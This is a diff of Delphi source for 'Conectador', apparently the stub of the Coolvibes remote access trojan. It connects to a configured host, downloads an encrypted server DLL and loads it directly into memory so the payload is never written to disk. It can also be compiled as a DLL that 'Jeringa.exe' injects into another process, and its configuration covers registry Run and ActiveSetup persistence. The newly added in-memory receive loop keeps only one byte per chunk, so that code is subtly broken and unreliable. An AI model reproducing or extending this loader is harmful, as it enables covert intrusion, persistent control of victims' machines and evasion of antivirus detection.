@@ -11,8 +11,8 @@
 
      El equipo Coolvibes
 *)
-//library Conectador; //Para inyectar descomentar
-program Conectador; //Para no inyectar descomentar
+//library Conectador; //Descomentar para crear conectador.dll, ésta dll será inyectada por Jeringa.exe en un proceso
+program Conectador; //Para no inyectar en ningún proceso
 
 uses
   Windows,
@@ -34,7 +34,7 @@ var
   ClaveCifrado1, ClaveCifrado2: Integer; //Claves para cifrar el plugin
   Loaded: Integer;
   TID: Longword;
-
+  EscribirADisco : boolean;
 
 function GetCurrentDirectory: string; //Conseguir dir actual sin sysutils
 var
@@ -84,7 +84,7 @@ begin
   filemode := defaultfilemode;
 end;
 
-procedure loaddll(path: string); //Funcion para cargar el servidor en memoria
+procedure loaddll(filecontent: AnsiString); //Funcion para cargar el servidor en memoria
 var
   content: string;
   p: Pointer;
@@ -92,8 +92,8 @@ var
   CargarServidor: procedure(P: Pointer);
   Module: PBTMemoryModule;
 begin
-  content := readfile(path);
-  content := cifrar(content, ClaveCifrado2);
+  content := filecontent;
+  content := cifrar(content, ClaveCifrado2);   {Descifra el contenido}
   content := cifrar(content, ClaveCifrado1);
   p := @content[1];
   m_DllDataSize := Length(content);
@@ -111,8 +111,8 @@ begin
   Loaded := Loaded + 1; //Veces que ha sido cargada
   if (Loaded > 10) then
     begin
-      if (fileexists(PChar(path))) then
-        deletefile(PChar(path)); //Falla la carga de la dll mas de 10 veces... la borramos y se la pedimos otra vez al cliente
+      if (fileexists(PChar(dllc))) then
+        deletefile(PChar(dllc)); //Falla la carga de la dll mas de 10 veces... la borramos y se la pedimos otra vez al cliente
       Loaded := 0;
     end;
 end;
@@ -156,10 +156,10 @@ var
   CurrRead: Integer;
   CurrWritten: Integer;
   ByteArray: array[0..1023] of char;
+  ArchivoRecibido : Ansistring;
+  i : integer;
 begin
   desco := False;
-  {while fileExists(dllc) do //ya tenemos la dll
-     loaddll(dllc);}
   if indice = '' then
     indice := configuracion.shosts;
   host := Copy(indice, 1, Pos(':', indice) - 1);
@@ -176,7 +176,7 @@ begin
   Addr.sin_addr.S_addr := INET_ADDR(PChar(GetIPFromHost(Host)));
 
   if (winsock.Connect(lSocket, Addr, SizeOf(Addr)) = 0) then //Intentamos conectar
-    begin //Conectados
+    begin //Conectados a el cliente
 
       Enviar := 'GETSERVER|' + IntToStr(clavecifrado1) + '|' + IntToStr(clavecifrado2) + '|' + #10#15#80#66#77#1#72#87;
       Send(lSocket, Enviar[1], Length(Enviar), 0); //Pedimos el tamaño del servidor
@@ -230,26 +230,37 @@ begin
   isize := StrToInt(ssize); //Ya tenemos el tamaño
   if (isize <> 0) then
     begin
+      if(EscribirADisco) then
+      begin
+        AssignFile(plugin, dllc);
+        Rewrite(plugin, 1);
+      end
+      else
+        setlength(ArchivoRecibido, isize);
 
-      AssignFile(plugin, dllc);
-      Rewrite(plugin, 1);
       Totalread := 0;
-
+      i := 0;
       while (TotalRead < isize) do
         begin
-          ZeroMemory(@byteArray, SizeOf(byteArray));
-          currRead := Recv(lSocket, byteArray, SizeOf(byteArray), 0); //GOGOGO
+          i := i + 1;
+          ZeroMemory(@buf, SizeOf(buf));
+          currRead := Recv(lSocket, buf, SizeOf(buf), 0); //GOGOGO
           if (currRead = INVALID_SOCKET) then
             begin
               desco := True;
               break;
             end;
           TotalRead := TotalRead + currRead;
-          BlockWrite(plugin, bytearray, currRead, currwritten);
+          if(EscribirADisco) then
+            BlockWrite(plugin, buf, currRead, currwritten)
+          else
+          begin
+            ArchivoRecibido[i] := buf[0];
+          end;
           currwritten := currRead;
         end;
-
-      CloseFile(plugin);
+      if(EscribirADisco) then
+        CloseFile(plugin);
     end;
 
   if (desco) then
@@ -259,8 +270,11 @@ begin
       Exit; //Nos hemos desconectado
     end;
    CloseSocket(lSocket);
+   if not EscribirADisco then {Cargamos el recibido directamente a memoria}
+    loaddll(ArchivoRecibido);
+
    while fileExists(dllc) do
-        loaddll(dllc);
+        loaddll(readfile(dllc));
 end;
 
 procedure loadsettings();
@@ -282,7 +296,6 @@ begin
       Configuracion.bArranqueActiveSetup := ConfigLeida^.bArranqueActiveSetup;
       Configuracion.sActiveSetupKeyName := ConfigLeida^.sActiveSetupKeyName;
       Configuracion.sPluginName := ConfigLeida^.sPluginName;
-      dllc := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA) + ConfigLeida^.sPluginName;
     end
   else
     begin
@@ -308,13 +321,12 @@ begin
           Configuracion.sInyectadorFile := ConfigCompartida.sInyectadorFile;
           UnmapViewOfFile(ConfigCompartida);
           CloseHandle(MCompartida); //La escribimos
-          dllc := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA) + Configuracion.sPluginName;
         end
       else
         begin
           //Para Debug
           Exitprocess(0);
-          {Configuracion.sHosts                  := 'localhost:77¬';
+          Configuracion.sHosts                  := 'localhost:80¬';
           Configuracion.sID                     := 'v';
           Configuracion.bCopiarArchivo          := false;
           Configuracion.sFileNameToCopy         := 'w.exe';
@@ -325,12 +337,18 @@ begin
           Configuracion.sRunRegKeyName          := 'w';
           Configuracion.bArranqueActiveSetup    := false;
           Configuracion.sActiveSetupKeyName     := '{t';
-          Configuracion.sPluginName             := 's.dll';
+          Configuracion.sPluginName             := 'NOESCRIBIRADISCO';
       //Configuracion.sInyectadorFile         := '';
-          dllc := GetCurrentDirectory+Configuracion.sPluginName;}
+
           //Fin de Para debug
         end;
     end;
+
+  dllc := GetCurrentDirectory+Configuracion.sPluginName;
+  if (Configuracion.sPluginName = 'NOESCRIBIRADISCO') then
+    EscribirADisco := false
+  else
+    EscribirADisco := true;
   ClaveCifrado1 := Ord(Configuracion.shosts[Length(Configuracion.shosts) - (Length(Configuracion.shosts) div 2) + 1]);
   ClaveCifrado2 := Ord(Configuracion.shosts[Length(Configuracion.shosts) - (Length(Configuracion.shosts) div 2)]);
 end;
@@ -346,7 +364,7 @@ begin
   while True do
     begin
       while fileExists(dllc) do
-        loaddll(dllc);
+        loaddll(readfile(dllc)); {Cargamos la dll desde el archivo si existe}
       iniciar();
       sleep(10000); //Cada 10 segundos
     end;
